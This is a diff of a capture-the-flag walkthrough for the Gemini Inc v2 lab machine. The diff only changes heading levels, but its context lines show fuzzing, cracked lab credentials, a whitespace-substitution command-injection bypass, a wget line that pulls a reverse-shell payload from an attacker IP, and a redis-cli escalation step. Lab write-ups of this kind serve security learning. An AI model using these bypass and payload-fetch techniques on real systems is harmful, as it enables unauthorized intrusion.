@@ -55,7 +55,7 @@ PORT   STATE SERVICE REASON         VERSION
 ```
 `nmap` finds `22/tcp` and `80/tcp open`. Nothing unusual.
 
-## Directory/File Enumeration
+### Directory/File Enumeration
 
 Since the site is more secure now, let's take a different approach this time—fuzzing. The tool for such a job is `wfuzz`. It's fast, comes with high quality wordlists, and easy-to-use filters for response code, number of lines, words, and even characters.
 
@@ -85,7 +85,7 @@ A lot has changed in v2. It exposes files such as `activate.php` and `registrati
 
 ![0.nn7sk2whrm8](/assets/images/posts/gemini-inc-v2-walkthrough/0.nn7sk2whrm8.png)
 
-## User Registration and Activation
+### User Registration and Activation
 
 It's obvious there's a user registration and activation process. Look at the respective pages in the browser.
 
@@ -217,7 +217,7 @@ user=Gemini;pass=edbd1887e772e13c251f688a5f10c1ffbb67960d
 
 Or we could crack the password hashes offline with John the Ripper, in which case, Gemini's password is `secretpassword`.
 
-## Admin Panel
+### Admin Panel
 
 The **Admin Panel** is in display after I log in to Gemini's account.
 
@@ -243,7 +243,7 @@ Recall the file `blacklist.txt` uncovered during fuzzing? It had a test for ille
 
 ![0.y241xdjfa4g](/assets/images/posts/gemini-inc-v2-walkthrough/0.y241xdjfa4g.png)
 
-## Execute Command
+### Execute Command
 
 The most common shell in Linux distributions is `bash` and it uses whitespace as the separator between the command, option(s), and argument(s). For example, in this command execution— `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator between the command `wget`, the option `-O`, and the arguments `/tmp/rev` and `192.168.10.128/rev`. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute the space character (`\x20`) with the tab character (`\x09`) in the previous example and it would still execute.
 
@@ -337,7 +337,7 @@ redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save
 
 ![0.bwzw8a9z1nd](/assets/images/posts/gemini-inc-v2-walkthrough/0.bwzw8a9z1nd.png)
 
-## It Sure Was Fun
+### It Sure Was Fun
 
 ![0.cna2uzm6g4d](/assets/images/posts/gemini-inc-v2-walkthrough/0.cna2uzm6g4d.png)
 
